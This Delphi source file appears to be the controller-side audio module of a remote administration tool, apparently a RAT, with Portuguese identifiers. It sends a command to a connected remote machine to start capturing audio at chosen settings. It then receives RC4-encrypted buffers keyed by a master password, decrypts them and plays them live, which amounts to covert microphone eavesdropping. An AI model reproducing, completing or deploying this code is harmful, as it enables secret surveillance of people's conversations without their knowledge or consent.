unit UnitAudio;

interface

uses
  Windows, Messages, SysUtils, Variants, Graphics, Controls, Forms,
  Dialogs, StdCtrls, Buttons, ExtCtrls, IdAntiFreezeBase,
  IdAntiFreeze, IdBaseComponent, IdComponent, IdTCPServer, IdThreadMgr,
  IdThreadMgrDefault, ACMOut, ACMConvertor, MMSystem, ComCtrls, UnitPrincipal,
  Classes;

type
  TFormAudio = class(TForm)
    Panel1: TPanel;
    RadioGroup1: TRadioGroup;
    RadioGroup2: TRadioGroup;
    BitBtn1: TBitBtn;
    BitBtn2: TBitBtn;
    ProgressBar1: TProgressBar;
    Label1: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure BitBtn1Click(Sender: TObject);
    procedure BitBtn2Click(Sender: TObject);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormShow(Sender: TObject);
  private
    Servidor: PConexao;
    AThreadTransfer: TIdPeerThread;
    ACMO: TACMOut;
    ACMC: TACMConvertor;
    { Private declarations }
  public
    NomePC: String;
    procedure OnRead(Recebido: String; AThread: TIdPeerThread); overload;
    constructor Create(aOwner: TComponent; ConAux: PConexao);overload;
  end;

var
  FormAudio: TFormAudio;

implementation

{$R *.dfm}

Uses
  UnitComandos,
  funcoesdiversascliente,
  UnitStrings,
  UnitCryptString,
  UnitConexao;

constructor TFormAudio.Create(aOwner: TComponent; ConAux: PConexao);
begin
  inherited Create(aOwner);
  Servidor := ConAux;
end;

procedure TFormAudio.FormCreate(Sender: TObject);
begin
  FormPrincipal.ImageListIcons.GetBitmap(264, bitbtn1.Glyph);
  FormPrincipal.ImageListIcons.GetBitmap(265, bitbtn2.Glyph);
end;

procedure TFormAudio.OnRead(Recebido: String; AThread: TIdPeerThread);
var
  TempStr: string;
  SizeBuffer: int64;
  OndeSalvar: string;
  S: TMemoryStream;
  i: integer;
begin
  if copy(recebido, 1, pos('|', recebido) - 1) = AUDIOGETBUFFER then
  begin
    AThreadTransfer := Athread;

    delete(recebido, 1, pos('|', recebido));
    sleep(1000);

    BitBtn2.Enabled := true;

    while AThreadTransfer.Connection.Connected = true do
    begin
      i := gettickcount;
      // sleep(5) alterado rsrs
      while gettickcount < i + 5 do application.ProcessMessages;

      Tempstr := AThreadTransfer.Connection.ReadLn;
      if pos('|', Tempstr) <= 0 then continue;
      try
        SizeBuffer := strtoint(copy(Tempstr, 1, pos('|', Tempstr) - 1));
        except
        continue;
      end;
      if SizeBuffer <= 0 then continue;
      ProgressBar1.Max := SizeBuffer;
      ProgressBar1.Position := 0;

      recebido := ReceberBuffer(SizeBuffer, AThread, ProgressBar1);
      recebido := EnDecryptStrRC4B(recebido, MasterPassword);

      if length(recebido) <= 0 then continue;
      label1.Caption := FormatByteSize(length(recebido));
      S := TMemoryStream.Create;
      StrToStream(S, recebido);
      S.Position := 0;
      ACMO.Play(S.Memory^, S.Size);
      S.Free;
    end;
  end else

end;

procedure TFormAudio.BitBtn1Click(Sender: TObject);
var
  Format: TWaveFormatEx;
begin
  if not Servidor.Athread.Connection.Connected then Exit;

  if radiogroup2.ItemIndex = 0 then Format.nChannels := 2
  else Format.nChannels := 1;

  Format.nSamplesPerSec := StrToInt(radiogroup1.Items.Strings[radiogroup1.itemindex]);

  Format.wBitsPerSample := 16;
  Format.nAvgBytesPerSec := Format.nSamplesPerSec * Format.nChannels * 2;
  Format.nBlockAlign := Format.nChannels * 2;
  ACMC.FormatIn.Format.nChannels := Format.nChannels;
  ACMC.FormatIn.Format.nSamplesPerSec := Format.nSamplesPerSec;
  ACMC.FormatIn.Format.nAvgBytesPerSec := Format.nAvgBytesPerSec;
  ACMC.FormatIn.Format.nBlockAlign := Format.nBlockAlign;
  ACMC.FormatIn.Format.wBitsPerSample := Format.wBitsPerSample;

  try
    EnviarString(Servidor.Athread, AUDIOGETBUFFER + '|' +
                                   inttostr(Format.nChannels) + '|' +
                                   radiogroup1.Items.Strings[radiogroup1.itemindex] + '|', true);
    except
  end;

  BitBtn1.Enabled := false;
  BitBtn2.Enabled := false;
  RadioGroup1.Enabled := Not RadioGroup1.Enabled;
  RadioGroup2.Enabled := Not RadioGroup2.Enabled;
end;

procedure TFormAudio.BitBtn2Click(Sender: TObject);
var
  i: integer;
begin
  EnviarString(Servidor.Athread, AUDIOSTOP + '|', true);
  i := gettickcount;
  while gettickcount < i + 2000 do
  begin
    application.processmessages;
    sleep(10);
  end;
  BitBtn1.Enabled := true;
  BitBtn2.Enabled := false;
  RadioGroup1.Enabled := Not RadioGroup1.Enabled;
  RadioGroup2.Enabled := Not RadioGroup2.Enabled;
end;

procedure TFormAudio.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
var
  i: integer;
begin
  CanClose := false;
  EnviarString(Servidor.Athread, AUDIOSTOP + '|', true);
  i := gettickcount;
  while gettickcount < i + 2000 do
  begin
    application.processmessages;
    sleep(10);
  end;
  CanClose := true;
end;

procedure TFormAudio.FormShow(Sender: TObject);
begin
  ACMO := TACMOut.Create(nil);
  ACMC := TACMConvertor.Create;
  ACMO.NumBuffers := 0;
  ACMO.Open(ACMC.FormatIn);
  label1.Caption := '';

  BitBtn1.Enabled := true;
  BitBtn2.Enabled := false;
  RadioGroup1.Enabled := BitBtn1.Enabled;
  RadioGroup2.Enabled := BitBtn1.Enabled;
end;

end.
